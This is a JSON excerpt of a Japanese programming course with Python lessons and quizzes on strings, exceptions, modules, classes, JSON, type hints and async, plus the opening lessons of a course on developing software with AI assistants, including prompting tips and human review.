     "body": "## このレッスンのゴール\n\n- f-string を読める\n- よく使う文字列メソッドが分かる\n\n## f-string：値を埋め込む\n\n```python\nname = \"Ryo\"\nprice = 1234.5\nprint(f\"{name}さんの合計は {price:,.0f} 円\")   # Ryoさんの合計は 1,234 円\n```\n\n先頭の `f` と `{ }` がポイント。`{ }` の中は **Python の式** で、`:` の後ろは表示の書式です。\n\n| 書式 | 意味 | 例 |\n|---|---|---|\n| `{x:.2f}` | 小数 2 桁 | `3.14` |\n| `{x:,}` | 3 桁区切り | `1,234` |\n| `{x:>5}` | 5 文字幅で右寄せ | `   42` |\n| `{x=}` | 「x=値」の形（デバッグ用） | `x=42` |\n\n## よく使うメソッド\n\n```python\ns = \"  Hello, World  \"\ns.strip()          # \"Hello, World\"（前後の空白を除く）\ns.lower()          # \"  hello, world  \"\n\"a,b,c\".split(\",\") # [\"a\", \"b\", \"c\"]（区切って リストに）\n\"-\".join([\"a\",\"b\"])# \"a-b\"（リストをつなげる）\n\"cat\".replace(\"c\", \"h\")  # \"hat\"\n\"Hello\".startswith(\"He\") # True\n\"py\" in \"python\"   # True（含むか）\n```\n\n`split` と `join` は対になっていて、CSV やログの処理で頻出です。\n\n## 文字列は変更できない\n\n```python\ns = \"abc\"\ns.upper()     # \"ABC\" を「新しく作って返す」\nprint(s)      # \"abc\" のまま！\ns = s.upper() # 入れ直す必要がある\n```\n\nメソッドは元の文字列を変えず、**新しい文字列を返します**（イミュータブル＝変更不可）。\n\n## 複数行・特殊文字\n\n```python\ntext = \"\"\"複数行の\n文字列\"\"\"\npath = r\"C:\\new\\folder\"   # r\"...\" は \\ を特別扱いしない（raw 文字列）\n\"改行は\\nこう書く\"\n```\n\n## 他の言語では\n\n| Python | JavaScript | その他 |\n|---|---|---|\n| `f\"{name}さん\"` | `` `${name}さん` ``（バッククォート） | Ruby `\"#{name}\"`、C# `$\"{name}\"` |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`f\"{3.14159:.2f}\"` の結果は？",
        "choices": [
         "\"3.14\"",
         "\"3.14159\"",
         "\"3.1\""
        ],
        "answer": 0,
        "explain": ".2f は小数点以下 2 桁です。"
       },
       {
        "question": "`\"a b c\".split()` の結果は？",
        "choices": [
         "\"abc\"",
         "[\"a\", \"b\", \"c\"]",
         "(\"a\", \"b\", \"c\")"
        ],
        "answer": 1,
        "explain": "split は文字列を区切ってリストにします（引数なしなら空白で区切る）。"
       },
       {
        "question": "`s = \"hi\"; s.upper(); print(s)` で表示されるのは？",
        "choices": [
         "hi",
         "HI"
        ],
        "answer": 0,
        "explain": "文字列は変更できないので、upper() の結果を入れ直さない限り s は変わりません。"
       }
      ]
     ],
     "id": "06-strings"
    },
    {
     "title": "例外処理 try / except",
     "level": 2,
     "minutes": 12,
     "concepts": [
      "errors"
     ],
     "summary": "エラーが起きても止まらないようにする仕組み。",
     "body": "## このレッスンのゴール\n\n- `try / except / else / finally` の流れを追える\n- `raise` の意味が分かる\n- 「何でも except」の危うさを説明できる\n\n## 基本形\n\n```python\ntry:\n    age = int(input(\"年齢: \"))\nexcept ValueError:\n    print(\"数字を入力してください\")\n    age = 0\n```\n\n`try` の中でエラー（**例外**）が起きたら、残りを飛ばして `except` に移ります。\n起きなければ `except` は無視されます。\n\n## 全部入りの形\n\n```python\ntry:\n    f = open(\"data.txt\")\n    text = f.read()\nexcept FileNotFoundError:\n    print(\"ファイルがありません\")\nexcept PermissionError as e:\n    print(\"読めません:\", e)      # e にエラーの詳細が入る\nelse:\n    print(\"読めました\")          # 例外が起きなかったときだけ\nfinally:\n    print(\"後片付け\")            # 必ず実行される\n```\n\n## raise：自分でエラーを起こす\n\n```python\ndef withdraw(balance, amount):\n    if amount > balance:\n        raise ValueError(\"残高不足です\")\n    return balance - amount\n```\n\n「おかしな状態のまま進むより、ここで止める」ための仕組みです。呼び出し元が `try` で受け止めます。\n\n## ⚠️ AI のコードで注意したい書き方\n\n```python\ntry:\n    do_something()\nexcept Exception:\n    pass          # エラーを握りつぶしている！\n```\n\n`except Exception: pass` は **どんなエラーも黙って無視** します。動いているように見えて、実はデータが壊れていても気づけません。\n少なくともログを出す（`print` や `logging`）のが望ましく、レビューで指摘すべきポイントです。\n\n## 他の言語では\n\n| 言語 | 書き方 |\n|---|---|\n| JavaScript / Java / C# | `try { } catch (e) { } finally { }` |\n| Go | 例外がなく、`result, err := f()` と **エラーを値で返す** |\n| Rust | `Result<T, E>` 型と `?` 演算子 |\n\nGo や Rust は「失敗するかもしれない」ことを **戻り値の型** で表します。コースを進めると出てきます。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "try の中でエラーが起きなかった場合、except ブロックは？",
        "choices": [
         "実行される",
         "実行されない"
        ],
        "answer": 1,
        "explain": "except は例外が起きたときだけ実行されます。"
       },
       {
        "question": "finally ブロックはいつ実行される？",
        "choices": [
         "エラーが起きたときだけ",
         "エラーが起きなかったときだけ",
         "どちらの場合も必ず"
        ],
        "answer": 2,
        "explain": "後片付け（ファイルを閉じる等）に使います。"
       },
       {
        "question": "`except Exception: pass` の問題点は？",
        "choices": [
         "どんなエラーも黙って無視するので、異常に気づけない",
         "文法エラーになる",
         "処理が遅くなる"
        ],
        "answer": 0,
        "explain": "エラーを握りつぶすのは典型的なアンチパターンです。"
       }
      ]
     ],
     "id": "07-exceptions"
    },
    {
     "title": "モジュールと import・pip",
     "level": 2,
     "minutes": 12,
     "concepts": [
      "modules",
      "tooling"
     ],
     "summary": "他のファイルやライブラリの機能を使う仕組み。",
     "body": "## このレッスンのゴール\n\n- `import` の 3 つの書き方を読める\n- 標準ライブラリと外部ライブラリの違い、pip の役割を説明できる\n- `if __name__ == \"__main__\":` の意味が分かる\n\n## import の書き方\n\n```python\nimport math                   # math.sqrt(2) のように使う\nfrom datetime import date     # date.today() と直接使える\nimport pandas as pd           # 別名をつける（pd.read_csv）\n```\n\n`as` の別名には慣習があります：`numpy as np`、`pandas as pd`、`matplotlib.pyplot as plt`。\nAI のコードでこれを見たら「データ分析系だな」と分かります。\n\n## 標準ライブラリ と 外部ライブラリ\n\n| | 例 | インストール |\n|---|---|---|\n| 標準ライブラリ | `os`, `json`, `datetime`, `pathlib`, `csv` | 不要（Python に付属） |\n| 外部ライブラリ | `requests`, `pandas`, `flask` | `pip install requests` |\n\n外部ライブラリの一覧は `requirements.txt` に書くのが慣習です。\n\n```text\nrequests==2.32.3\npandas>=2.0\n```\n\n```bash\npip install -r requirements.txt\n```\n\n**仮想環境（venv）** は、プロジェクトごとにライブラリを分けて入れるための仕組みです。AI が `python -m venv .venv` と言ってきたらこれのことです。\n\n## 自分のファイルも import できる\n\n```text\nmyapp/\n├── main.py\n└── utils.py      ← def format_price(x): ...\n```\n\n```python\n# main.py\nfrom utils import format_price\n```\n\nファイル 1 つ＝モジュール 1 つ。大きなプログラムは、こうして役割ごとにファイルを分けています。\n\n## `if __name__ == \"__main__\":`\n\n```python\ndef main():\n    print(\"実行されました\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\n「このファイルが **直接実行されたときだけ** `main()` を呼ぶ」という意味です。\n他のファイルから import されたときには実行されません。**Python プログラムの入口の目印** として覚えましょう。\n\n## 他の言語では\n\n| 言語 | 読み込み | パッケージ管理 | 一覧ファイル |\n|---|---|---|---|\n| Python | `import x` | pip | requirements.txt / pyproject.toml |\n| JavaScript | `import x from \"x\"` | npm | package.json |\n| Go | `import \"fmt\"` | go mod | go.mod |\n| Rust | `use x;` | cargo | Cargo.toml |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`from pathlib import Path` のあと、Path はどう使う？",
        "choices": [
         "Path(\"a.txt\")",
         "pathlib.Path(\"a.txt\") でしか使えない",
         "import Path が必要"
        ],
        "answer": 0,
        "explain": "from ... import で取り込んだ名前は直接使えます。"
       },
       {
        "question": "`ModuleNotFoundError: No module named 'pandas'` を直すには？",
        "choices": [
         "import pandas as pd に書き換える",
         "pip install pandas",
         "pandas.py を作る"
        ],
        "answer": 1,
        "explain": "外部ライブラリなのでインストールが必要です。"
       },
       {
        "question": "`if __name__ == \"__main__\":` の中身が実行されるのは？",
        "choices": [
         "そのファイルを直接実行したとき",
         "他のファイルから import されたとき",
         "いつでも"
        ],
        "answer": 0,
        "explain": "import されたときは実行されません。"
       }
      ]
     ],
     "id": "08-modules"
    },
    {
     "title": "内包表記とラムダ",
     "level": 3,
     "minutes": 15,
     "concepts": [
      "collections",
      "higher_order",
      "loops"
     ],
     "summary": "AI が好んで書く「短い書き方」を読み解く。",
     "body": "## このレッスンのゴール\n\n- リスト内包表記を「普通の for 文」に戻して読める\n- `lambda` と `sorted(key=...)` を読める\n\n## リスト内包表記\n\n```python\nprices = [100, 250, 80]\nwith_tax = [p * 1.1 for p in prices]\n```\n\nこれは次の for 文と同じです。\n\n```python\nwith_tax = []\nfor p in prices:\n    with_tax.append(p * 1.1)\n```\n\n**読み方のコツ：真ん中の `for` から読み、最後に先頭の式を見る**。\n「prices の各 p について → p * 1.1 を集める」。\n\n## 条件つき\n\n```python\nexpensive = [p for p in prices if p >= 100]          # 絞り込み → [100, 250]\nlabels = [\"高\" if p >= 100 else \"安\" for p in prices] # 変換 → [\"高\", \"高\", \"安\"]\n```\n\n`if` が **後ろ** にあれば「絞り込み」、**前** にあれば「条件で値を変える」です。\n\n## 辞書内包表記・ジェネレータ式\n\n```python\nsquares = {n: n * n for n in range(4)}     # {0: 0, 1: 1, 2: 4, 3: 9}\ntotal = sum(p * 1.1 for p in prices)       # ( ) の中は一度にリストを作らない\n```\n\n## lambda：名前のない小さな関数\n\n```python\ndouble = lambda x: x * 2\n# ↓ と同じ\ndef double(x):\n    return x * 2\n```\n\n`lambda 引数: 戻り値` という形。単独で使うより、**他の関数に渡す** ときに使われます。\n\n## sorted / max の key\n\n```python\nusers = [{\"name\": \"Ken\", \"age\": 30}, {\"name\": \"Ryo\", \"age\": 20}]\nsorted(users, key=lambda u: u[\"age\"])           # 年齢順\nmax(users, key=lambda u: u[\"age\"])[\"name\"]      # \"Ken\"\n```\n\n`key=` は「何を基準に比べるか」を関数で渡します。関数を値として渡すこの考え方を **高階関数** と呼び、JavaScript の `map` / `filter` にもつながります。\n\n## 読みにくいときは for 文に戻す\n\n内包表記が二重・三重になっていたら、無理に 1 行で理解せず、**紙やメモに for 文で書き直す** と確実に読めます。\n\n## 他の言語では\n\n```javascript\nconst withTax = prices.map(p => p * 1.1);              // JS：map とアロー関数\nconst expensive = prices.filter(p => p >= 100);\n```\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`[x * 2 for x in [1, 2, 3] if x != 2]` の結果は？",
        "choices": [
         "[2, 4, 6]",
         "[2, 6]",
         "[1, 3]"
        ],
        "answer": 1,
        "explain": "2 を除いた 1 と 3 をそれぞれ 2 倍します。"
       },
       {
        "question": "`lambda a, b: a + b` と同じ意味の関数は？",
        "choices": [
         "def f(a, b): return a + b",
         "def f(a + b): return",
         "def f(): return a + b"
        ],
        "answer": 0,
        "explain": "lambda は引数と戻り値だけを書いた短い関数です。"
       },
       {
        "question": "`sorted(words, key=len)` は何順に並べる？",
        "choices": [
         "アルファベット順",
         "文字列の長さ順",
         "逆順"
        ],
        "answer": 1,
        "explain": "key に渡した関数（len）の結果で比べます。"
       }
      ]
     ],
     "id": "09-comprehensions-lambda"
    },
    {
     "title": "クラスとオブジェクト",
     "level": 3,
     "minutes": 18,
     "concepts": [
      "classes"
     ],
     "summary": "データと処理をひとまとめにする設計図。",
     "body": "## このレッスンのゴール\n\n- クラス（設計図）とインスタンス（実物）の違いを説明できる\n- `__init__` と `self` の役割が分かる\n- 継承の基本を読める\n\n## クラス＝設計図、インスタンス＝実物\n\n```python\nclass Dog:\n    def __init__(self, name, age):\n        self.name = name     # インスタンスごとのデータ（属性）\n        self.age = age\n\n    def bark(self):          # インスタンスの処理（メソッド）\n        return f\"{self.name}: ワン！\"\n\npochi = Dog(\"ポチ\", 3)       # インスタンスを作る\nprint(pochi.bark())          # ポチ: ワン！\nprint(pochi.age)             # 3\n```\n\n| 用語 | 意味 |\n|---|---|\n| `class Dog:` | 設計図の定義 |\n| `__init__` | 作るときに最初に呼ばれる初期化処理（コンストラクタ） |\n| `self` | 「このインスタンス自身」。`self.name` は「自分の名前」 |\n| `pochi.bark()` | メソッド呼び出し。`self` には自動で `pochi` が入る |\n\n## なぜクラスを使う？\n\n辞書でも同じデータは持てますが、クラスにすると **データと、それを扱う処理をセットで管理** できます。\n「犬のデータ」と「吠える処理」がバラバラにならないのです。\n\n## 継承：設計図を引き継ぐ\n\n```python\nclass Animal:\n    def __init__(self, name):\n        self.name = name\n    def speak(self):\n        return \"...\"\n\nclass Cat(Animal):           # Animal を引き継ぐ\n    def speak(self):         # 上書き（オーバーライド）\n        return f\"{self.name}: ニャー\"\n```\n\n`Cat` は `Animal` の `__init__` をそのまま使い、`speak` だけを自分用に変えています。\n`super().__init__(...)` と書いてあれば「親の初期化も呼ぶ」という意味です。\n\n## AI のコードでよく見る：dataclass\n\n```python\nfrom dataclasses import dataclass\n\n@dataclass\nclass User:\n    name: str\n    age: int = 0\n\nu = User(\"Ryo\", 20)\n```\n\n`@dataclass` を付けると `__init__` などを自動で作ってくれます。データを入れるだけのクラスはこの書き方が主流です。\n\n## 他の言語では\n\n| 言語 | 特徴 |\n|---|---|\n| JavaScript / Java / C# | `class` と `this`（Python の `self` にあたる） |\n| Go | クラスが無く、`struct`（構造体）＋メソッド |\n| Rust | `struct` ＋ `impl` ブロック |\n\n「データ＋処理をまとめる」という考え方は共通で、書き方が違うだけです。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`__init__` はいつ呼ばれる？",
        "choices": [
         "インスタンスを作るとき（Dog(\"ポチ\", 3) のとき）",
         "メソッドを呼ぶたび",
         "プログラム終了時"
        ],
        "answer": 0,
        "explain": "初期化のための特別なメソッドです。"
       },
       {
        "question": "メソッド内の `self.name` は何を指す？",
        "choices": [
         "クラスの名前",
         "そのインスタンス自身の name 属性",
         "引数の name"
        ],
        "answer": 1,
        "explain": "self はメソッドを呼び出したインスタンス自身です。"
       },
       {
        "question": "`class Cat(Animal):` の意味は？",
        "choices": [
         "Cat は Animal を継承している",
         "Cat の引数は Animal",
         "Animal が Cat を継承している"
        ],
        "answer": 0,
        "explain": "カッコの中が親クラスです。"
       }
      ]
     ],
     "id": "10-classes"
    },
    {
     "title": "ファイルと JSON",
     "level": 3,
     "minutes": 15,
     "concepts": [
      "io",
      "data_formats"
     ],
     "summary": "ファイルの読み書きと、データ交換で定番の JSON・CSV。",
     "body": "## このレッスンのゴール\n\n- `with open(...)` の形と、それが安全な理由を説明できる\n- JSON と Python の辞書・リストの対応が分かる\n\n## with open：ファイルを読み書きする\n\n```python\nwith open(\"memo.txt\", \"w\", encoding=\"utf-8\") as f:\n    f.write(\"こんにちは\\n\")\n\nwith open(\"memo.txt\", encoding=\"utf-8\") as f:\n    text = f.read()\n```\n\n| モード | 意味 |\n|---|---|\n| `\"r\"`（省略時） | 読み込み |\n| `\"w\"` | 書き込み（**既存の中身は消える**） |\n| `\"a\"` | 末尾に追記 |\n\n`with` を使うと、ブロックを抜けたとき（エラーでも）**自動でファイルを閉じて** くれます。\n`encoding=\"utf-8\"` は日本語の文字化けを防ぐためのお約束です。\n\n## pathlib：パスを扱う現代的な方法\n\n```python\nfrom pathlib import Path\n\npath = Path(\"data\") / \"users.json\"   # / でパスをつなげる\nif path.exists():\n    text = path.read_text(encoding=\"utf-8\")\n```\n\nAI のコードでは `os.path` より `pathlib` を見ることが増えています。\n\n## JSON\n\nJSON は Web API や設定ファイルで使われる、データの書き方です。Python の辞書・リストとほぼ同じ見た目です。\n\n```python\nimport json\n\ndata = {\"name\": \"Ryo\", \"skills\": [\"Python\"], \"active\": True}\ntext = json.dumps(data, ensure_ascii=False, indent=2)  # Python → JSON 文字列\nback = json.loads(text)                                  # JSON 文字列 → Python\n```\n\n| JSON | Python |\n|---|---|\n| `{}` オブジェクト | `dict` |\n| `[]` 配列 | `list` |\n| `true / false` | `True / False` |\n| `null` | `None` |\n\nファイルなら `json.load(f)` / `json.dump(data, f)`（`s` が付かない方）を使います。\n`ensure_ascii=False` は日本語を `あ` のような形にせずそのまま書くための指定です。\n\n## CSV\n\n```python\nimport csv\n\nwith open(\"scores.csv\", encoding=\"utf-8\", newline=\"\") as f:\n    for row in csv.DictReader(f):   # 1 行目を見出しとして辞書で読む\n        print(row[\"name\"], row[\"score\"])\n```\n\nCSV から読んだ値は **すべて文字列** です。計算するなら `int(row[\"score\"])` が必要です。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`open(\"a.txt\", \"w\")` で既存のファイルを開くと？",
        "choices": [
         "末尾に追記される",
         "元の中身は消えて上書きされる",
         "エラーになる"
        ],
        "answer": 1,
        "explain": "追記したいときは \"a\" モードを使います。"
       },
       {
        "question": "`with open(...) as f:` を使う一番の利点は？",
        "choices": [
         "使い終わったら自動でファイルを閉じてくれる",
         "読み込みが速くなる",
         "文字化けしなくなる"
        ],
        "answer": 0,
        "explain": "エラーが起きても確実に閉じられます。"
       },
       {
        "question": "JSON の `null` は Python では？",
        "choices": [
         "0",
         "\"\"",
         "None"
        ],
        "answer": 2,
        "explain": "true/false は True/False、null は None に対応します。"
       }
      ]
     ],
     "id": "11-files-and-json"
    },
    {
     "title": "型ヒント",
     "level": 4,
     "minutes": 15,
     "concepts": [
      "type_hints",
      "types"
     ],
     "summary": "AI のコードに必ずと言っていいほど付いている「型の注釈」を読む。",
     "body": "## このレッスンのゴール\n\n- 関数の型ヒントを読んで、何を受け取り何を返すか分かる\n- `list[str]`、`dict[str, int]`、`X | None` などを読める\n\n## 型ヒントとは\n\n```python\ndef greet(name: str, times: int = 1) -> str:\n    return f\"こんにちは {name}\" * times\n```\n\n`name: str` は「name には文字列が来る想定」、`-> str` は「文字列を返す」という **注釈** です。\nPython は実行時にこれをチェックしません（違う型を渡しても動いてしまう）。\nそれでも AI がよく付けるのは、**読む人とエディタにとっての説明書** になるからです。\n\n## よく出る書き方\n\n| 型ヒント | 意味 |\n|---|---|\n| `list[str]` | 文字列のリスト |\n| `dict[str, int]` | キーが文字列・値が整数の辞書 |\n| `tuple[int, int]` | 整数 2 つのタプル |\n| `str \\| None` | 文字列 または None（古い書き方：`Optional[str]`） |\n| `int \\| float` | 整数か小数（古い書き方：`Union[int, float]`） |\n| `Any` | 何でもよい |\n| `Callable[[int], str]` | int を受け取り str を返す関数 |\n\n```python\ndef find_user(users: list[dict[str, str]], name: str) -> dict[str, str] | None:\n    for u in users:\n        if u[\"name\"] == name:\n            return u\n    return None\n```\n\n型ヒントだけで「ユーザーのリストから名前で探し、見つからなければ None」と読めます。\n**`| None` を見たら「呼び出し側で None のチェックが必要」** という合図です。\n\n## 型を確認するツール\n\n`mypy` や `pyright` というツールを使うと、型ヒントと実際の使い方が食い違っていないか検査できます。\nVS Code で赤い波線が出るのはこの仕組みです。\n\n## TypeScript への橋渡し\n\n```typescript\nfunction greet(name: string, times: number = 1): string { ... }\n```\n\nTypeScript の型注釈は Python の型ヒントとそっくりです。違いは、TypeScript では **型が合わないと実行前にエラー** になる点です。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`def f(x: int) -> bool:` の意味は？",
        "choices": [
         "整数を受け取り真偽値を返す（想定の）関数",
         "bool を受け取り int を返す関数",
         "x が int でないと必ずエラーになる関数"
        ],
        "answer": 0,
        "explain": "Python では型ヒントは注釈で、実行時には強制されません。"
       },
       {
        "question": "`str | None` が戻り値の型なら、呼び出し側で注意することは？",
        "choices": [
         "None が返る場合の処理",
         "必ず空文字が返ること",
         "例外が起きること"
        ],
        "answer": 0,
        "explain": "「見つからない」ときなどに None が返る可能性を示しています。"
       },
       {
        "question": "`dict[str, list[int]]` に合うデータは？",
        "choices": [
         "[\"a\", 1]",
         "{\"a\": [1, 2]}",
         "{1: [\"a\"]}"
        ],
        "answer": 1,
        "explain": "キーが文字列、値が整数のリストです。"
       }
      ]
     ],
     "id": "12-type-hints-dataclass"
    },
    {
     "title": "デコレータと async/await",
     "level": 4,
     "minutes": 20,
     "concepts": [
      "higher_order",
      "async",
      "http_api"
     ],
     "summary": "Web フレームワークや API のコードで必ず出てくる 2 つの書き方。",
     "body": "## このレッスンのゴール\n\n- `@` で始まる行（デコレータ）の意味を説明できる\n- `async` / `await` が「待ち時間を有効に使う」ための書き方だと分かる\n\n## デコレータ：関数に機能をかぶせる\n\n```python\n@app.get(\"/hello\")\ndef hello():\n    return {\"message\": \"こんにちは\"}\n```\n\nFastAPI や Flask で必ず見る形です。`@app.get(\"/hello\")` は\n「この関数を、`/hello` にアクセスされたときに呼ぶよう **登録する**」という意味です。\n\n仕組みは「関数を受け取って、加工した関数を返す関数」です。\n\n```python\ndef log_call(func):\n    def wrapper(*args, **kwargs):\n        print(f\"{func.__name__} を呼びます\")\n        return func(*args, **kwargs)\n    return wrapper\n\n@log_call          # say = log_call(say) と同じ\ndef say():\n    print(\"やあ\")\n```\n\n**読むときは「@ の付いた関数に、何か追加の役割が与えられている」と理解すれば十分** です。\nよく見るもの：`@dataclass`、`@property`、`@staticmethod`、`@app.route`、`@pytest.fixture`。\n\n## async / await：待っている間に別の仕事をする\n\nネットからデータを取る処理は、結果が返るまで「待ち」が発生します。\n普通のコードは待っている間なにもできませんが、`async` を使うと **待ち時間に他の処理を進められます**。\n\n```python\nimport asyncio\n\nasync def fetch(name, seconds):\n    await asyncio.sleep(seconds)     # 待つ（その間、他の処理に譲る）\n    return f\"{name} 完了\"\n\nasync def main():\n    results = await asyncio.gather(  # 3 つを同時に進める\n        fetch(\"A\", 1), fetch(\"B\", 1), fetch(\"C\", 1),\n    )\n    print(results)                    # 約 1 秒で 3 つとも終わる\n\nasyncio.run(main())\n```\n\n| キーワード | 意味 |\n|---|---|\n| `async def` | 「途中で待つかもしれない関数」の定義 |\n| `await` | ここで結果を待つ（その間は他の処理に譲る） |\n| `asyncio.gather` | 複数を同時に進めて、全部終わるのを待つ |\n| `asyncio.run` | 非同期の世界の入口 |\n\n**`await` は `async def` の中でしか使えません。** AI のコードで `await` を見たら、その関数の定義に `async` が付いているはずです。\n\n## JavaScript では\n\n```javascript\nasync function main() {\n  const res = await fetch(\"https://example.com/api\");\n  const data = await res.json();\n}\n```\n\nJavaScript の非同期は **Promise** という仕組みの上にあり、`async/await` の見た目は Python とほぼ同じです。JavaScript コースで詳しく学びます。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`@app.get(\"/users\")` が付いた関数はいつ呼ばれる？",
        "choices": [
         "ファイルを読み込んだとき",
         "/users にアクセス（GET リクエスト）されたとき",
         "1 秒ごと"
        ],
        "answer": 1,
        "explain": "デコレータでフレームワークに登録されています。"
       },
       {
        "question": "`await` を使える場所は？",
        "choices": [
         "async def で定義した関数の中",
         "どこでも",
         "class の中だけ"
        ],
        "answer": 0,
        "explain": "普通の def の中では使えません。"
       },
       {
        "question": "asyncio.gather で 1 秒かかる処理を 3 つ同時に実行すると、全体はおよそ何秒？",
        "choices": [
         "約 1 秒",
         "約 3 秒",
         "約 0 秒"
        ],
        "answer": 0,
        "explain": "待ち時間が重なるので、ほぼ 1 つ分の時間で終わります。"
       }
      ]
     ],
     "id": "13-decorators-async"
    }
   ],
   "status": "open"
  },
  {
   "title": "AI と一緒に開発する",
   "icon": "🤖",
   "order": 15,
   "category": "topic",
   "description": "AI への頼み方・任せ方・確かめ方。Git、差分レビュー、テスト、AI を組み込んだアプリの仕組みまで。",
   "levels": {
    "1": "入門",
    "2": "基礎",
    "3": "実践"
   },
   "id": "100-ai-dev",
   "lessons": [
    {
     "title": "AI と一緒に開発するとは",
     "level": 1,
     "minutes": 10,
     "concepts": [
      "ai_coding"
     ],
     "summary": "AI の 3 つの使い方と、人間が担う役割。",
     "body": "## このレッスンのゴール\n\n- AI を使った開発の 3 つの形（チャット・補完・エージェント）を説明できる\n- AI に任せても **人間に残る仕事** を挙げられる\n\n## 3 つの使い方\n\n| 形 | どんなもの | 例 |\n|---|---|---|\n| 💬 **チャット型** | 質問すると答えやコードを返す。コピーして使う | Claude、ChatGPT などのチャット画面 |\n| ✍️ **補完型** | エディタで書いている途中に、続きを提案する | GitHub Copilot などの入力補完 |\n| 🤖 **エージェント型** | 目的を伝えると、ファイルを読み・書き・コマンドを実行し・確認まで自分で進める | Claude Code など |\n\nこのサイト自体も、エージェント型の Claude Code が作っています。\nエージェント型ほど **任せられる範囲が広い** 代わりに、**何をしたかを人間が確認する力** が大事になります。\n\n## 開発の流れはどう変わる？\n\n| 作業 | 以前 | AI と一緒なら |\n|---|---|---|\n| 何を作るか決める | 人間 | **人間**（AI に相談はできる） |\n| コードを書く | 人間 | 主に AI |\n| 動くか確かめる | 人間 | AI も実行・テストできるが、**最終判断は人間** |\n| 説明・保守する | 人間 | **人間**（AI に聞きながら） |\n\n## 人間に残る 4 つの仕事\n\n1. **目的を決める**：何のために、何を作るか\n2. **伝える**：AI が迷わないように条件を言葉にする（次のレッスン）\n3. **確かめる**：コードを読み、動かし、安全か判断する\n4. **責任を持つ**：公開する・人に渡すのは自分\n\nこのサイトで「コードを読んで説明する力」を鍛えているのは、まさに 3 と 4 のためです。\n\n## よくある誤解\n\n- ❌「AI が書いたから正しい」→ もっともらしい間違いを書くことがある（レッスン 3）\n- ❌「読めなくても動けばいい」→ 壊れたとき、AI に何を頼めばいいかも分からなくなる\n- ⭕「AI は優秀な同僚。でもレビューは自分の仕事」\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "ファイルの編集やコマンドの実行まで自分で進める AI の形は？",
        "choices": [
         "補完型",
         "エージェント型",
         "チャット型"
        ],
        "answer": 1,
        "explain": "目的を伝えると、読む・書く・実行・確認を繰り返して進めます。"
       },
       {
        "question": "AI と一緒に開発するとき、人間に最後まで残る仕事は？",
        "choices": [
         "コードを 1 行ずつタイプすること",
         "目的を決めることと、結果を確かめて責任を持つこと",
         "文法を暗記すること"
        ],
        "answer": 1,
        "explain": "書く作業は AI に任せられても、判断と責任は人間に残ります。"
       }
      ]
     ],
     "id": "01-ai-dev-overview"
    },
    {
     "title": "伝わる頼み方",
     "level": 1,
     "minutes": 12,
     "concepts": [
      "ai_coding"
     ],
     "summary": "AI に意図どおりのコードを書いてもらうための伝え方の型。",
     "body": "## このレッスンのゴール\n\n- 頼み方に入れるべき 4 つの要素を挙げられる\n- あいまいな頼み方を、伝わる頼み方に直せる\n\n## AI は「すごく優秀な新人」\n\nAI は知識も腕もありますが、**あなたの頭の中は見えません**。\n入社初日の優秀な新人に仕事を頼むつもりで、背景から伝えるとうまくいきます。\n\n## 4 つの要素\n\n| 要素 | 内容 | 例 |\n|---|---|---|\n| 🎯 **目的** | 何のために作るのか | 毎月の家計簿を集計したい |\n| 📦 **前提** | 今の状況・環境・使っているもの | CSV は銀行からダウンロード。Python 3.12、Windows |\n| 🚧 **制約** | 守ってほしいこと・やってほしくないこと | 外部ライブラリは使わない。元の CSV は書き換えない |\n| ✅ **完成の条件** | 何ができたら OK か | カテゴリ別の合計が表示され、テストが通る |\n\n## 直してみよう\n\n❌ あいまいな頼み方\n\n> 家計簿のプログラム作って\n\n⭕ 伝わる頼み方\n\n> 銀行からダウンロードした CSV（列は「日付, 内容, 金額」）を読み込んで、月ごと・内容ごとの支出合計を表示する Python スクリプトを作ってください。\n> - Python 3.12 / Windows で使います\n> - 標準ライブラリだけで書いてください\n> - 元の CSV ファイルは書き換えないでください\n> - サンプルの CSV も一緒に作って、実行結果を見せてください\n\n## さらに効くコツ\n\n- **例を見せる**：入力と期待する出力の例があると、ずれが激減する\n- **理由を添える**：「初心者が読むので、短い関数に分けて」のように理由があると、AI が他の場面でもその意図を汲める\n- **分からないことは聞いてもらう**：「不明点があれば作る前に質問して」\n- **大きな仕事は分ける**：「まず設計だけ出して」→ 確認 → 「では実装して」\n\n## 返ってきたら\n\n- 動かす前に、このサイトのコースで学んだ読み方で **ざっと読む**\n- 分からない所は「この行は何をしている？」とそのまま聞く\n- 違ったら、**どこがどう違うか** を具体的に伝える（「違う」だけでは直せない）\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "頼み方の 4 要素に含まれないのは？",
        "choices": [
         "目的",
         "制約",
         "AI の性格",
         "完成の条件"
        ],
        "answer": 2,
        "explain": "目的・前提・制約・完成の条件の 4 つです。"
       },
       {
        "question": "「外部ライブラリは使わないで」は 4 要素のどれ？",
        "choices": [
         "目的",
         "制約",
         "完成の条件"
        ],
        "answer": 1,
        "explain": "守ってほしいルールなので制約です。"
       },
       {
        "question": "返ってきたコードが期待と違ったとき、良い伝え方は？",
        "choices": [
         "「違う、やり直して」",
         "「◯◯の部分が△△になっているが、□□にしてほしい」"
        ],
        "answer": 1,
        "explain": "どこがどう違うかを具体的に伝えると、一回で直りやすくなります。"
       }
      ]
     ],
     "id": "02-prompting"
    },
    {
     "title": "AI の得意・苦手とハルシネーション",
     "level": 1,
     "minutes": 12,
     "concepts": [
      "ai_coding",
      "security"
     ],
     "summary": "AI がもっともらしく間違える場面を知り、確かめ方を身につける。",
